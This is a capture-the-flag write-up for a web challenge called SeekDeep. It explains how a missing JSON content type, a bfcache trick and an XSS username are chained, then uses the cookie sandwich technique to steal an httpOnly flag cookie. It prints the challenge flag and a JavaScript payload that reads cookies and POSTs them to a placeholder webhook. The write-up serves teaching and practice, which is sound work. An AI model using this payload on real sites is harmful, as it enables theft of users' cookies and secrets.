# SeekDeep Writeup

This web application requires you to chain two code mistakes to retrieve from the admin bot.

The first mistake that we can take advantage is the fact that responses are HTML in the api endpoints.

```python
@app.route('/api/following')
@login_required
def get_following():
    username = session.get("username")
    if request.headers.get("X-Requested-With") != "XMLHttpRequest":
        return json.dumps({"error": "Invalid request"}), 400
    user = User.query.filter_by(username=username).first()
    if not user:
        return json.dumps({"error": "User not found"})
    followers_list = [{"username": u.username} for u in user.followers.all()]
    following_list = [{"username": u.username} for u in user.following.all()]
    return json.dumps({
        "followers": followers_list,
        "following": following_list
    })
```

This api endpoint returns a JSON response but the content type is not set to `application/json`, so the browser will interpret it as HTML.
However, in the application, it doesn't access /api/following directly but rather makes a fetch request with the `X-Requested-With` header set to `XMLHttpRequest`.
In order to trigger HTML in the browser using this endpoint, we need to take advantage of the [bfcache](https://web.dev/articles/bfcache).
To do this, we can open the /api/following endpoint in a tab, get the admin's browser to cache it as 400 invalid request, then let browser make the valid request to the /api/following endpoint. using /social endpoint.
After that, we can use the `history.back()` method to go back to the cached page, which will now contain the HTML response.
Now that we have the HTML response, we can inject a script by letting the admin follow an account with script tag in the username and that will give us XSS on the admin's browser. Now how do we get the httpOnly flag cookie?

Throughout the site we have lots of endpoints that mess with the cookies and we have an endpoint that returns the cookies in the response body.

```python
@app.route('/api/prophecies')
def get_prophecies():
    keys = ["ascend", "lucky", "spirit", "colors", "riddle"]
    prophecies = {key: request.cookies.get(key) for key in keys}
    return json.dumps(prophecies)
```

This gives us a possible way to retrieve the flag using the [cookie sandwich technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique).
Ordering the cookies in the right way, we can retrieve the flag cookie from the admin's browser and post it to our webhook.

```javascript
document.cookie="ascend=;path=/";
document.cookie="colors=;path=/";
document.cookie="lucky=;path=/";
document.cookie="riddle=;path=/";
document.cookie="spirit=;path=/";
document.cookie='ascend=";path=/api/prophecies';
document.cookie='spirit=";path=/';
setTimeout(()=>fetch("http://seekdeep:3000/api/prophecies",{credentials:"include"})
    .then(response => response.text())
    .then(data => fetch("WEBHOOK_SITE", {method: "POST", body: data, mode:'no-cors'})), 500);
```

Flag: `cube{Th1nk1ng_ReAL1Y_d3eEEe3333p}